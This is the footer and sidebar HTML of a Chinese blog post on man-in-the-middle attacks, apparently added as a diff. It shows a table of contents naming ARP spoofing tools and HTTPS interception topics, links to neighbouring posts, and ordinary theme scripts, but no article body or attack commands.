+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/48016.html">https://www.freebuf.com/sectool/48016.html</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/>http://www.moonback.xyz/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-03-26T12:31:06+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年3月26日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%8A%98%E8%85%BE/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>折腾</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>中间人攻击</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/&title=中间人攻击学习 - 明月归的小站&summary=本篇博客主要介绍中间人攻击的相关内容！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/&title=中间人攻击学习 - 明月归的小站&summary=本篇博客主要介绍中间人攻击的相关内容！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/&title=中间人攻击学习 - 明月归的小站&summary=本篇博客主要介绍中间人攻击的相关内容！"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/03/30/%E7%9F%A5%E8%AF%86%E7%82%B9/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Mysql提权总结</p>
+                <p class='content'>本篇博客主要介绍了mysql提权的相关内容！
+
+
+mysql提权简介我个人理解的mysql提权就是通过sql注入，爆破mysql用户密码等方式从而让我们可以执行sql语句，在此基础上达到执行命令...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/03/22/%E7%9F%A5%E8%AF%86%E7%82%B9/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/'>
+                <p class='title'>PHP反序列化之原生类<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了php原生类反序列化的相关内容！
+
+
+基础知识先回顾一下：
+123456当对象被创建的时候调用：__construct()当对象被销毁的时候调用：__destruct()当对象...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-text">中间人攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#arp%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97"><span class="toc-text">arp地址欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#arp-scan"><span class="toc-text">arp-scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arpspoof"><span class="toc-text">arpspoof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#driftnet"><span class="toc-text">driftnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xerosploit"><span class="toc-text">xerosploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%B1%80%E5%9F%9F%E7%BD%91%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87"><span class="toc-text">抓取局域网里的图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xerosploit%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C"><span class="toc-text">xerosploit一些操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6%E6%8A%93https"><span class="toc-text">伪造证书抓https</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#https-%E9%99%8D%E7%BA%A7%E6%94%BB%E5%87%BB"><span class="toc-text">https 降级攻击</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
